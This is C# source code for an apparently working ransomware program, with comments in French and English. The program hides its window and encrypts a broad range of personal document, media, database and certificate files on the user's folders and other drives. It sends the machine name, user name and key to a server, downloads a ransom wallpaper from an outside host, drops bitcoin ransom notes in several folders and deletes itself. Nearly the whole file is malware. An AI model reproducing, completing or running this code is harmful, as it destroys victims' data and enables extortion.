using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Management;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace Gendarmerie_B.V._3
{
    public partial class GendarmerieForm : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        //Url to send encryption key and computer info
        string targetURL = "http://localhost/Server/write.php";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        string backgroundImageUrl = "https://panafricaine.com/ranso4.jpg"; //image de fond de l'ecran après cryptage des fichiers

        string charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/@^";

        public GendarmerieForm()
        {
            InitializeComponent();
        }

        private void GendarmerieForm_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        //hide process also from taskmanager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }


        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

            //Salt must be at least 8 byte, choose your flawor but remember to match it with decrypter!!!
            byte[] saltBytes = new byte[] { 1, 1, 2, 2, 3, 3, 4, 4 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption,creation du mot de passe pour le cryptage des fichiers
        public string CreateRandomString(int length, String str)
        {
            string valid = str;
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        //Envoie du mot de passe de la cible au serveur
        public void SendPassword(string password)
        {

            try
            {
                string info = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
               var fullUrl = targetURL + info;
               var conent = new System.Net.WebClient().DownloadString(fullUrl);
            }
            catch (Exception)
            {

            }
        }


        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            try
            {
                File.WriteAllBytes(file, bytesEncrypted);
                String extension = ".fucking"; //CreateRandomString(6, "abcdefghijklmnopqrstuvwxyz1234567890");//extension des fichiers après cryptage
                System.IO.File.Move(file, file + extension);
            }
            catch (System.UnauthorizedAccessException) { }
        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            try
            {
                //extensions to be encrypt
                var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
                ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", 
                ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk",
                ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx",
                ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay",
                ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
                ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", 
                ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", 
                ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".cs",  ".exe" , ".lnk" , ".mpeg" , ".mp3", ".mkv", ".divx", ".ogg", ".zip" , ".wav", ".bat" , ".index"
            };

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);

                for (int i = 0; i < files.Length; i++)
                {

                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {

                    //System folders Exclusion, be carefull, without this the OS will not works!!!
                    if (childDirectories[i].Contains("Windows") || childDirectories[i].Contains("Program Files") || childDirectories[i].Contains("Program Files (x86)")) continue;

                    encryptDirectory(childDirectories[i], password);
                    messageCreator();
                }
            }
            catch (SystemException) { }

        }

        
        //check for internet connection
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.fr"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }


        public void startAction()
        {
            //Generate a 15 character password
            string password = "CreatePassword(15)";
            //MoveVirus();
            string path = "\\Desktop\\";
            string pathdow2 = "\\Downloads\\";
            string pathdoc = "\\Documents\\";
            string pathim = "\\Pictures\\";
            string pathmu = "\\Music\\";
            string pathvi = "\\Videos\\";
            string startPath = userDir + userName + path;
            string startPathdow = userDir + userName + pathdow2;
            string startPathdoc = userDir + userName + pathdoc;
            string startPathim = userDir + userName + pathim;
            string startPathmu = userDir + userName + pathmu;
            string startPathvi = userDir + userName + pathvi;
            
            //string startPath =  userDir + userName + path;
            SendPassword(password);
            //Logical + Remote drives
            string[] drives = System.IO.Directory.GetLogicalDrives();
            foreach (string str in drives)
            {
                //C: Override to avoid to cypher local disk for testing purpose
                //If you want to Cyper all comment the lines below till "else"
                if (str == "C:\\")
                {
                    encryptDirectory(startPath, password);
                    encryptDirectory(startPathdow, password);
                    encryptDirectory(startPathdoc, password);
                    encryptDirectory(startPathim, password);
                    encryptDirectory(startPathmu, password);
                    encryptDirectory(startPathvi, password);

                    messageCreator();
                }
                else
                    encryptDirectory(str, password);
                    messageCreator();
            }

            bool Internet;
            string backgroundImageName = userDir + userName + "\\ransom.jpg";
            // creation d'une boucle si la connexion n'existe pas et puis si la connexion revient,l'image de fond va changé et pour envoyer le mot de passe 
            do
            {
                Internet = CheckForInternetConnection();
                if (Internet == true)
                {
                    SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
                    SendPassword(password);
                }

            } while (Internet == false);

            //Set password null to avoid in-memory detection
            password = null;
            selfDestroy();
            System.Windows.Forms.Application.Exit();

        }

        //Selfdestroy itself at the end 
        public void selfDestroy()
        {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C timeout 2 && Del /Q /F " + Application.ExecutablePath;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
        }

        //modication de l'image du bureau
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //telechargement de l'image du bureau depuis internet
        private void SetWallpaperFromWeb(string url, string path)
        {
            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri(url), path);
                SetWallpaper(path);
            }
            catch (Exception) { }
        }

        //Create a message to store in every crypted path
        public void messageCreator()
        {
            string path = "\\Desktop\\Message.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ", " ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin",""," 3) lorsque je reçois les bitcoins , je décrypte vos fichiers" ,"","",
                              "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ", " Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address",""," 3) when I receive bitcoins, I decrypt your files" 
                                                          
                              
                              };
                    
           System.IO.File.WriteAllLines(fullpath, lines);

            string pathdow2 = "\\Downloads\\Message.txt";
            string fullpathdow = userDir + userName + pathdow2;
            string[] lines1 = { "                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ", " ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin",""," 3) lorsque je reçois les bitcoins , je décrypte vos fichiers" ,"","",
                              "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ", " Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address",""," 3) when I receive bitcoins, I decrypt your files" 
                                                          
                              
                              };
                    
            System.IO.File.WriteAllLines(fullpathdow, lines1);

            string pathdoc = "\\Documents\\Message.txt";
            string fullpathdoc = userDir + userName + pathdoc;
            string[] lines2 = { "                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ", " ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin",""," 3) lorsque je reçois les bitcoins , je décrypte vos fichiers" ,"","",
                              "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ", " Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address",""," 3) when I receive bitcoins, I decrypt your files" 
                                                          
                              
                              };
                    
            System.IO.File.WriteAllLines(fullpathdoc, lines2);

            string pathim = "\\Pictures\\Message.txt";
            string fullpathim = userDir + userName + pathim;
            string[] lines3 = { "                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ", " ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin",""," 3) lorsque je reçois les bitcoins , je décrypte vos fichiers" ,"","",
                              "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ", " Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address",""," 3) when I receive bitcoins, I decrypt your files" 
                                                          
                              
                              };
                    
            System.IO.File.WriteAllLines(fullpathim, lines3);

            string pathmu = "\\Music\\Message.txt";
            string fullpathmu = userDir + userName + pathmu;
            string[] lines4 = { "                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ", " ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin",""," 3) lorsque je reçois les bitcoins , je décrypte vos fichiers" ,"","",
                              "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ", " Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address",""," 3) when I receive bitcoins, I decrypt your files" 
                                                          
                              
                              };
                    
            System.IO.File.WriteAllLines(fullpathmu, lines4);

            string pathvi = "\\Videos\\Message.txt";
            string fullpathvi = userDir + userName + pathvi;
            string[] lines5 = { "                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ", " ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin",""," 3) lorsque je reçois les bitcoins , je décrypte vos fichiers" ,"","",
                              "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ", " Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address",""," 3) when I receive bitcoins, I decrypt your files" 
                                                          
                              
                              };
                         
            System.IO.File.WriteAllLines(fullpathvi, lines5);
        }
        
    }
}



